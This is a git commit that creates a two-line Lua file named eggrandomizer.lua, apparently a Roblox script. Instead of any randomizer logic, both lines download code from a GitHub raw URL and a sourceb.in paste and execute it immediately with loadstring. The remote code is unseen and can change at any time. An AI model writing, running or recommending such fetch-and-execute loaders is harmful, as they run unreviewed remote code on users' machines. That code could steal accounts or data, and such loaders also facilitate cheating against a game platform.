7bbb658c69f0f72d76688ae629ac25ef99d88c00
Devluatech <cozenml@gmail.com>
2025-07-17 16:45:10 +0800

    Create eggrandomizer.lua

---
+++ eggrandomizer.lua
@@ -0,0 +1,2 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/KuniDevLua/X/refs/heads/main/UpdatedLuaKuni"))()
+loadstring(game:HttpGet("https://cdn.sourceb.in/bins/t5Cuk55fKq/0", true))()
